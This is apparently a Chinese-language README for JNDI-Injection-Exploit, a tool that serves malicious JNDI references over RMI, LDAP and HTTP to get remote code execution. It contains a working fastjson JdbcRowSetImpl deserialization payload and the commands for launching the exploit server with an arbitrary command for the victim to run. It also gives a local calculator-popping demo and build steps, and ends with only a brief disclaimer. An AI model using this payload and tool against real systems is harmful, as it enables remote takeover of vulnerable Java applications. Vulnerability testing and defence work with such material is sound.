### JNDI-Injection-Exploit 简明说明

**JNDI-Injection-Exploit** 是一个用于生成可用 JNDI 链接并提供后台服务的工具，支持启动 RMI 服务器、LDAP 服务器和 HTTP 服务器。其 RMI 和 LDAP 服务基于 [marshalsec](https://github.com/mbechler/marshalsec)，并进行修改以与 HTTP 服务联动。

使用此工具可以生成 JNDI 链接，将其插入到漏洞测试的 POC 中。例如：

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Object","autoCommit":true}
```

可以将 `rmi://127.0.0.1:1099/Object` 替换为该工具生成的链接，以测试目标漏洞。

---

### 使用方法

**运行命令：**
```shell
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [命令] [-A] [地址]
```

**参数说明：**
- **`-C`**：远程执行的命令。（可选，默认命令为 `open /Applications/Calculator.app`）
- **`-A`**：服务器地址，支持 IP 或域名。（可选，默认取第一网卡地址）

**注意事项：**
1. 确保服务器端口 **1099**、**1389** 和 **8180** 可用，或修改代码中默认端口。
2. 命令会通过 `Runtime.getRuntime().exec()` 执行，确保格式正确。
   - 若使用 `bash -c ...`，请加双引号。

---

### 示例

**本地演示：**
1. 启动工具：
   ```shell
   java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open /Applications/Calculator.app" -A "127.0.0.1"
   ```
2. 将生成的 JNDI 链接（例如 `rmi://127.0.0.1/jfxllc`）注入漏洞应用：
   ```java
   public static void main(String[] args) throws Exception {
       InitialContext ctx = new InitialContext();
       ctx.lookup("rmi://127.0.0.1/jfxllc");
   }
   ```
   执行后，命令将触发执行，同时在控制台打印日志。

---

### 安装方法

1. **直接下载 jar 文件：**
   从 [Releases 页面](https://github.com/welk1n/JNDI-Injection-Exploit/releases)下载最新版本。

2. **源码构建：**
   - 克隆代码：
     ```shell
     git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
     cd JNDI-Injection-Exploit
     ```
   - 使用 Maven 构建（需要 Java 1.8+ 和 Maven 3.x+）：
     ```shell
     mvn clean package -DskipTests
     ```

---

### 注意事项

- 本工具仅供教育及漏洞测试使用，任何滥用行为与开发者无关。

